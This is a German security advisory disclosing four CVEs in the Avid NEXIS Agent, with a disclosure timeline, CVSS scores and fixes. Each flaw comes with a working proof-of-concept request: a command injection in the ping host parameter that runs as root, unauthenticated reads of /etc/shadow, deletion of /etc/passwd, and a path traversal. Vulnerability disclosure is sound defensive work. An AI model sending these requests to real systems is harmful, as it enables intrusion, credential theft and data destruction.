# Inhaltsverzeichnis

# Einführung

Während einer Kundenprüfung stieß ich auf den Avid NEXIS® Agent in der Version 22.12.0.174 sowie ältere Versionen. Die älteren Versionen hatten ein Standardpasswort, das verwendet werden konnte, um Zugang zu erhalten. Glücklicherweise war dieses Standardpasswort auch auf den Servern mit dieser Version gesetzt. Als ich jedoch die Binärdateien herunterlud und auf einer meiner Testmaschinen installierte, zeigte sich, dass dieses Standardpasswort nicht mehr gesetzt/verwendet wurde. Vielleicht wurde es nur in früheren Versionen verwendet, aber nicht geändert, als der Server aktualisiert wurde. Nach meinem Wissen verwendet die Software das Linux- oder Windows-Benutzerpasswort für die Anmeldung. Frühere Versionen könnten also einen Benutzer erstellt haben, der in der Version 22.12.0.174 noch verwendet wird.

Version 22.12.0.174 schien die neueste Version der Software zu sein, als ich die Schwachstellen im Juni 2023 ursprünglich entdeckte. Im Dezember 2023 wurde jedoch die neue Version 23.12 veröffentlicht, wie uns unser Kunde mitteilte. Leider konnten wir die neueste Version nicht in die Hände bekommen. Wir sind jedoch weiterhin der Überzeugung, dass die meisten Fehler nicht behoben wurden, da sie recht alt zu sein scheinen (einer in gSoap wurde ursprünglich 2019 identifiziert) und eher auf schlechte Sicherheitspraktiken als auf einen einfachen Fehler zurückzuführen sind.

Seit Juli 2023 versuchte ich, den Hersteller zu kontaktieren. Im September 2023, nachdem ich über E-Mail und mehrere Twitter-Konten kein einziges Wort vom Hersteller gehört hatte, entschied ich mich, die Schwachstelle der deutschen Regierungsbehörde BSI (Bundesamt für Sicherheit in der Informationstechnik) als Vermittler zu melden, da sie möglicherweise bessere Möglichkeiten haben, um den Kontakt zum Hersteller aufzunehmen.

Im August 2024 informierte uns das BSI, dass der Hersteller ihnen gegenüber angab, dass die Schwachstelle CVE-2024-26290 (authentifizierte Remote-Befehlsausführung) im  [Update 2024.6.0](https://kb.avid.com/pkb/articles/troubleshooting/en239659) behoben wurde. Ebenfalls im August 2024 kontaktierte uns der Direktor der Informationssicherheit bei Avid und teilte uns mit, dass sie verstehen wollen, wieso die Kommunikation/Meldung untergegangen war, da sie ihren Meldeprozess verbessern möchten. Leider haben wir bis heute keine Updates zu den anderen Schwachstellen erhalten.

Die identifizierten Schwachstellen lassen sich ziemlich leicht finden. DriveByte hat die Binärdateien nicht genauer untersucht, um nach weiteren Fehlern zu suchen. Also, falls irgendwelche Bug-Hunter einen Blick darauf werfen wollen: Viel Spaß!

Aber kommen wir nun zu den inhaltlichen Themen.

# Schwachstellen

## Authenticated Remote Command Injection (Linux): CVE-2024-26290

### Beschreibung

Die Anwendung ist anfällig für eine „Authentifizierte Remote-Befehlsausführung“ im `GET`-Parameter `host` für die Übergabewerte in `ping` und `tracert`. Dies tritt jedoch nur auf Linux-Systemen auf. Windows zeigt nicht das gleiche Verhalten. Authentifizierte Angreifer können daher Code mit root-Rechten auf dem zugrunde liegenden Betriebssystem ausführen.
Die offizielle Beschreibung von AVID lautet:
*"Avid NEXIS Web Agent Input Validation issue can lead to Remote Command Execution (RCE)
The Avid NEXIS Web Agent allows an authenticated user to execute system functions directed to a specific IP address. The Avid NEXIS Web Agent does not validate the inpu IP address and can execute commands without string validation. This allows an authenticated attacker to execute commands on the target machine."* [Quelle: June 20th 2024 Update](https://kb.avid.com/pkb/articles/troubleshooting/en239659).

### Proof of Concept

Die Schwachstelle kann mit folgender `GET`-Anfrage ausgelöst werden:

```http
GET /agent?r=tools&type=ping&host=127.0.0.1;id HTTP/1.1
Host: 192.168.40.141:5015
Cookie: avidagent=12345; userveragenttoken=3543434935133395140
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/119.0.6045.159 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Dest: script
 Referer: https://192.168.40.141:5015/agent
 Accept-Encoding: gzip, deflate, br
 Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
 Priority: u=1
 Connection: close
 ```
 
 Die Antwort sieht dann in etwa so aus (verkürzt):
 
 ```http
 HTTP/1.1 200 OK
Server: gSOAP/2.8
Content-Type: text/html; charset=utf-8
Content-Length: 3581
Connection: close
<html>
<head>
<title>192.168.40.141 - Avid NEXIS&#174; Agent 22.12.0.174</title>
...
<b class='rtop'><b class='r1'></b><b class='r2'></b><b class='r3'></b><b class='r4'></b></b><div id="content">12 <div style='display:none;' id='glassPane'><span class='aligner'></span><h4 class='align' id='glassPaneMessage'></h4></div><h2 class="table-title">
Ping Results
</h2>
<div class="plain">
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.045 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2029ms
rtt min/avg/max/mdev = 0.040/0.050/0.067/0.014 ms
uid=0(root) gid=0(root) groups=0(root)context=system_u:system_r:unconfined_service_t:s0
</pre></div>
</div>
...
```

### Behebung

Die offizielle Abhilfemaßnahme von Avid für dieses Problem lautet:
"The NEXIS Web Agent input validation has been resolved in the newest version of NEXIS 2024.6.0. Avid engineering recommends you upgrade to NEXIS 2024.6.0 (available for download on June 18, 2024) to resolve this issue.
If you are unable to update your NEXIS release at this time, you can mitigate the issue by configuring a firewall rule for the Storage Manager Agent (Port 5015) to whitelist access into NEXIS. " [source: June 20th 2024 Update](https://kb.avid.com/pkb/articles/troubleshooting/en239659).

DriveByte empfiehlt, sowohl auf die neueste Version zu aktualisieren als auch den Zugriff auf den Agent-Port einzuschränken. Dies beruht auf der Tatsache, dass es eine weitere (halb offizielle) Möglichkeit gibt, mit einem integrierten Dienstprogramm im Agenten Code auf dem Host auszuführen.

### CVSS
DriveByte hat die folgende CVSS 4.0 Basismetrik errechnet:

8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)


## Unauthenticated Arbitrary File Read (Linux/Windows): CVE-2024-26291

### Beschreibung

Die Anwendung ist anfällig für "Unauthenticated Arbitrary File Read ", also das auslesen von beliebigen Dateien. Dies betrifft sowohl den Agenten, der auf Linux als auch den, der auf Windows installiert ist. Der Parameter Pfad im Parameter `filename` wird nicht validiert. Dadurch kann jeder (eine Authentifizierung ist nicht erforderlich) beliebige Dateien lesen. Da die Anwendung standardmäßig mit den höchsten Rechten (root/NT_AUTHORITY SYSTEM) ausgeführt wird, sind Angreifer in der Lage, kritische Dateien wie `/etc/shadow` zu erlangen.

### Proof of Concept

Die Schwachstelle kann mit folgender `GET`-Anfrage ausgelöst werden:

```http
GET /logs?filename=%2Fetc%2fshadow HTTP/1.1
Host: 192.168.40.141:5015
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.40.141:5015/agent?context=5815&r=logs&request=dump_usrv_log
Accept-Encoding: gzip, deflate, br
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

Die Serverantwort sieht dann so aus (verkürzt):

```http
HTTP/1.1 200 OK
Server: gSOAP/2.8
Content-Type: application/octet-stream
Content-Length: 1164
Connection: close

root:$1$Or<redacted>njEucgDO1:19775:0:99999:7:::
...
avid-nexis:$5$t3v<redacted>bZgA:19774:0:99999:7:::
```
Wie wir sehen können, beantwortet der Server die Anfrage mit den Inhalten der angeforderten Datei.


### Behebung

Da uns bis heute kein offizieller Fix bekannt ist, empfehlen wir den Zugriff auf den Agenten-Port (Standard 5015) mithilfe eines Whitelist-Ansatzes einzuschränken.

### CVSS
DriveByte hat die folgende CVSS 4.0 Basismetrik errechnet:

8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)


## Authenticated Arbitrary File Deletion (Linux/Windows): CVE-2024-26292

### Beschreibung

Die Anwendung ist anfällig für eine authentifizierte willkürliche Dateilöschung. Dies betrifft sowohl den Agenten, der auf Linux als auch den, der auf Windows installiert ist. Da die Anwendung standardmäßig mit den höchsten Rechten (root/NT_AUTHORITY SYSTEM) ausgeführt wird, sind Angreifer in der Lage, kritische Dateien wie `/etc/shadow` etc. zu löschen.

### Proof of Concept

Die Schwachstelle kann mit folgender `GET`-Anfrage ausgelöst werden (verkürzt):

```http
GET /agent?filename=%2Fetc%2Fpasswd&r=logs&request=del_usrv_log HTTP/1.1
Host: 192.168.40.141:5015
Cookie: avidagent=12345; userveragenttoken=1294797077750987387
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
...
Referer: https://192.168.40.141:5015/agent?context=5815&r=logs&request=dump_usrv_log
...
```

### Behebung

Da uns auch hier bis heute kein offizieller Fix bekannt ist, empfehlen wir den Zugriff auf den Agenten-Port (Standard 5015) mithilfe eines Whitelist-Ansatzes einzuschränken.

### CVSS

DriveByte hat die folgende CVSS 4.0 Basismetrik errechnet:

7.1 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N)


## Unauthenticated Path Traversal (Linux/Windows): CVE-2024-26293

### Beschreibung

Die Anwendung ist anfällig für eine nicht authentifizierte Pfadüberschreitung. Dies betrifft den Agenten für Linux sowohl den für Windows. Da die Anwendung standardmäßig mit den höchsten Rechten (root/NT_AUTHORITY SYSTEM) ausgeführt wird, sind Angreifer in der Lage, kritische Dateien wie `/etc/shadow` usw. zu erlangen. Diese Schwachstelle in gSOAP 2.8 war bereits zuvor bekannt. [Dieser Link](https://www.exploit-db.com/exploits/47653) zeigt, dass diese Schwachstelle mindestens seit 2019 bekannt ist. Es scheint jedoch, dass die gSOAP-Version des Avid Nexis Agent nicht auf dem neuesten Stand ist.

### Proof of Concept

Die Schwachstelle kann mit folgender `GET`-Anfrage ausgelöst werden (verkürzt):

```http
GET /../../../../../../../../../../../../../../../../windows/win.ini%00/common/lib/jquery/jquery-1.11.3.min.js HTTP/1.1
Host: 192.168.40.129:5015
...
```
Wie wir sehen können, antwortet der Server mit dem Inhalt der angefragten Datei:

```http
HTTP/1.1 200 OK
Server: gSOAP/2.8
Content-Type: application/x-javascript
Content-Length: 92
Connection: close
Expires: Tue, 16 Jul 2024 11:56:11 GMT

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Behebung

Auch bei dieser Schwachstelle ist uns bis heute kein offizieller Fix bekannt. Wir empfehlen daher auch hier den Zugriff auf den Agenten-Port (Standard 5015) mithilfe eines Whitelist-Ansatzes einzuschränken.


### CVSS
DriveByte hat die folgende CVSS 4.0 Basismetrik errechnet:

8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)

# Danksagungen

Unser besonderer Dank geht an das BSI-Team für die Unterstützung auf unserem Weg und für die Bemühungen, den Hersteller in den Fall einzubeziehen.

# Disclosure Timeline
2023/07/14 - Erster Kontaktversuch mit dem Hersteller per E-Mail  
2023/07/31 - Kontaktversuch über Twitter an @Avid  
2023/09/24 - Erste Offenlegung der Schwachstelle zur Authentifizierten Remote-Befehlsausführung an das BSI  
2023/10/12 - Kontaktversuch über Twitter an @AvidSupport  
2023/11/08 - Nachricht vom BSI, dass sie bisher keine Reaktion des Herstellers erhalten konnten  
2024/01/11 - Nachricht vom BSI, dass sie bisher keine Reaktion des Herstellers erhalten konnten und dass sie CERT/CC / CISA einbezogen haben  
2024/02/23 - Nachricht vom BSI, dass sie bisher keine Reaktion des Herstellers erhalten konnten und dass auch CISA weiterhin versucht  
2024/02/26 - DriveByte informiert das BSI, dass wir 3 weitere Schwachstellen in der Software gefunden haben, jedoch nicht mehr die neueste Version haben und gerne die neueste Version erhalten würden  
2024/05/15 - BSI bewertet den verantwortungsvollen Offenlegungsfall als "gescheitert", da sie keinen Kontakt zum Hersteller herstellen konnten  
2024/05/21 - BSI bietet Hilfe beim Erhalt von CVEs für die Bugs über ENISA an  
2024/07/16 - Offizielle Meldung der weiteren Schwachstellen  
2024/07/25 - Hersteller kontaktiert das BSI und erwähnt die Behebung der ursprünglich gemeldeten Schwachstelle  
2024/07/25 - Antwort des BSI, dass sie erneut versuchen, die Schwachstellen an den Hersteller weiterzuleiten, da jetzt Kontakt besteht  
2024/08/05 - BSI informiert uns, dass der Hersteller keine CVEs ausstellen wird und dass sie den Bericht an die ENISA weiterleiten  
2024/08/06 - Hersteller kontaktiert DriveByte, um herauszufinden, was bei der Meldung schiefgelaufen ist  
2024/09/10 - ENISA sendet CVEs  
2024/08/06 - Hersteller kontaktiert DriveByte, um herauszufinden, was bei der Meldung schiefgelaufen ist  
2024/10/23 - Veröffentlichung des Advisory
